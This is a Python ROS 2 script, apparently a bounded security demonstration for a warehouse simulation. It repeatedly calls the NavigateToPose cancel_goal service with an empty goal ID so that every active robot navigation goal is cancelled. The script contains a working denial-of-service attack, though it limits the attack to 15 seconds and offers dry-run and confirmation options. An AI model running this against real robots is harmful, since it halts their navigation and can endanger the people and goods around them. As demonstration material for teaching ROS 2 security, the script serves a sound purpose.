#!/usr/bin/env python3

"""Bounded ROS 2 navigation-cancellation demonstration.

This program is intended only for the isolated warehouse simulation.

The program invokes the NavigateToPose cancellation service for a bounded
period. It does not publish to any robot velocity topic.
"""

import argparse
import time

import rclpy

from action_msgs.msg import GoalInfo
from action_msgs.srv import CancelGoal
from rclpy.node import Node
from rclpy.qos import (
    DurabilityPolicy,
    HistoryPolicy,
    QoSProfile,
    ReliabilityPolicy,
)
from std_msgs.msg import Bool
from std_msgs.msg import String


DEFAULT_CANCEL_SERVICE = (
    '/navigate_to_pose/_action/cancel_goal'
)

ATTACK_ACTIVE_TOPIC = (
    '/security_demo/attack_active'
)

ATTACK_STATUS_TOPIC = (
    '/security_demo/attack_status'
)


class NavigationCancelAttack(Node):
    """Cancel active NavigateToPose goals for a bounded period."""

    def __init__(self, service_name: str):
        super().__init__('navigation_cancel_attack')

        self.service_name = service_name

        self.client = self.create_client(
            CancelGoal,
            service_name,
        )

        status_qos = QoSProfile(
            reliability=ReliabilityPolicy.RELIABLE,
            durability=DurabilityPolicy.TRANSIENT_LOCAL,
            history=HistoryPolicy.KEEP_LAST,
            depth=1,
        )

        self.active_publisher = self.create_publisher(
            Bool,
            ATTACK_ACTIVE_TOPIC,
            status_qos,
        )

        self.status_publisher = self.create_publisher(
            String,
            ATTACK_STATUS_TOPIC,
            status_qos,
        )

        self.publish_state(
            active=False,
            status='IDLE',
        )

        self.get_logger().info(
            f'Target cancellation service: {service_name}'
        )

    def publish_state(
        self,
        active: bool,
        status: str,
    ) -> None:
        """Publish the current controlled-demo state."""

        active_message = Bool()
        active_message.data = active

        status_message = String()
        status_message.data = status

        self.active_publisher.publish(
            active_message
        )

        self.status_publisher.publish(
            status_message
        )

    def wait_for_target(
        self,
        timeout_sec: float,
    ) -> bool:
        """Wait for the cancellation service."""

        self.get_logger().info(
            'Waiting for NavigateToPose '
            'cancellation service...'
        )

        available = self.client.wait_for_service(
            timeout_sec=timeout_sec,
        )

        if available:
            self.get_logger().info(
                'Cancellation service discovered.'
            )
        else:
            self.get_logger().error(
                'Cancellation service was not discovered.'
            )

        return available

    def cancel_all_goals(
        self,
        timeout_sec: float,
    ) -> int:
        """Request cancellation of all eligible goals."""

        request = CancelGoal.Request()

        # A zero UUID and zero timestamp target all eligible goals.
        request.goal_info = GoalInfo()

        future = self.client.call_async(
            request
        )

        rclpy.spin_until_future_complete(
            self,
            future,
            timeout_sec=timeout_sec,
        )

        if not future.done():
            self.get_logger().warning(
                'Cancellation request timed out.'
            )
            return 0

        response = future.result()

        if response is None:
            self.get_logger().warning(
                'Cancellation service returned no response.'
            )
            return 0

        count = len(
            response.goals_canceling
        )

        if count > 0:
            self.get_logger().warning(
                'Cancellation accepted for '
                f'{count} goal(s).'
            )
        else:
            self.get_logger().info(
                'No active goal accepted for cancellation.'
            )

        return count

    def run_bounded_demo(
        self,
        duration: float,
        period: float,
        request_timeout: float,
    ) -> tuple[int, int, float]:
        """Run cancellation requests for a bounded duration."""

        start_time = time.monotonic()
        deadline = start_time + duration

        attempts = 0
        accepted = 0

        self.publish_state(
            active=True,
            status='ATTACK_ACTIVE',
        )

        self.get_logger().warning(
            'CONTROLLED DEMO STARTED: '
            'cancelling navigation goals for '
            f'{duration:.1f} seconds.'
        )

        try:
            while (
                rclpy.ok()
                and time.monotonic() < deadline
            ):
                attempts += 1

                accepted += self.cancel_all_goals(
                    timeout_sec=request_timeout,
                )

                remaining = (
                    deadline - time.monotonic()
                )

                if remaining > 0.0:
                    time.sleep(
                        min(
                            period,
                            remaining,
                        )
                    )

        finally:
            elapsed = (
                time.monotonic() - start_time
            )

            self.publish_state(
                active=False,
                status='COMPLETE',
            )

        return (
            attempts,
            accepted,
            elapsed,
        )


def parse_arguments():
    """Parse command-line arguments."""

    parser = argparse.ArgumentParser(
        description=(
            'Bounded ROS 2 navigation-cancellation '
            'demonstration.'
        )
    )

    parser.add_argument(
        '--duration',
        type=float,
        default=3.0,
        help=(
            'Demonstration duration in seconds. '
            'Allowed range: greater than 0 to 15. '
            'Default: 3.'
        ),
    )

    parser.add_argument(
        '--period',
        type=float,
        default=0.5,
        help=(
            'Seconds between cancellation attempts. '
            'Minimum: 0.2. Default: 0.5.'
        ),
    )

    parser.add_argument(
        '--discovery-timeout',
        type=float,
        default=10.0,
        help=(
            'Service discovery timeout in seconds. '
            'Default: 10.'
        ),
    )

    parser.add_argument(
        '--request-timeout',
        type=float,
        default=1.0,
        help=(
            'Timeout for each cancellation request. '
            'Default: 1.'
        ),
    )

    parser.add_argument(
        '--service',
        default=DEFAULT_CANCEL_SERVICE,
        help='Target CancelGoal service.',
    )

    parser.add_argument(
        '--dry-run',
        action='store_true',
        help=(
            'Discover the target service, but do not '
            'send cancellation requests.'
        ),
    )

    parser.add_argument(
        '--confirm',
        action='store_true',
        help=(
            'Require the operator to type ATTACK '
            'before execution.'
        ),
    )

    return parser.parse_args()


def validate(args) -> None:
    """Validate bounded demonstration arguments.

    This function performs no ROS operations and can
    therefore be tested independently.
    """

    if not 0.0 < args.duration <= 15.0:
        raise SystemExit(
            '--duration must be greater than 0 '
            'and no more than 15 seconds'
        )

    if args.period < 0.2:
        raise SystemExit(
            '--period must be at least 0.2 seconds'
        )

    if args.period > args.duration:
        raise SystemExit(
            '--period must not be greater '
            'than --duration'
        )

    if args.discovery_timeout <= 0.0:
        raise SystemExit(
            '--discovery-timeout must be '
            'greater than 0'
        )

    if args.request_timeout <= 0.0:
        raise SystemExit(
            '--request-timeout must be '
            'greater than 0'
        )


def main():
    """Run the controlled demonstration."""

    args = parse_arguments()
    validate(args)

    rclpy.init()

    node = NavigationCancelAttack(
        args.service
    )

    try:
        if not node.wait_for_target(
            args.discovery_timeout
        ):
            raise SystemExit(2)

        if args.dry_run:
            node.get_logger().info(
                'Dry run successful; '
                'no cancellation request sent.'
            )
            return

        if args.confirm:
            confirmation = input(
                'Type ATTACK to begin: '
            ).strip()

            if confirmation != 'ATTACK':
                node.get_logger().info(
                    'Operator cancelled '
                    'the demonstration.'
                )
                return

        (
            attempts,
            accepted,
            elapsed,
        ) = node.run_bounded_demo(
            duration=args.duration,
            period=args.period,
            request_timeout=args.request_timeout,
        )

        node.get_logger().warning(
            'CONTROLLED DEMO FINISHED: '
            f'elapsed={elapsed:.1f}s, '
            f'attempts={attempts}, '
            f'accepted_cancellations={accepted}.'
        )

    except KeyboardInterrupt:
        if rclpy.ok():
            node.publish_state(
                active=False,
                status='INTERRUPTED',
            )

            node.get_logger().warning(
                'Demonstration interrupted '
                'by operator.'
            )

    finally:
        node.destroy_node()

        if rclpy.ok():
            rclpy.shutdown()


if __name__ == '__main__':
    main()
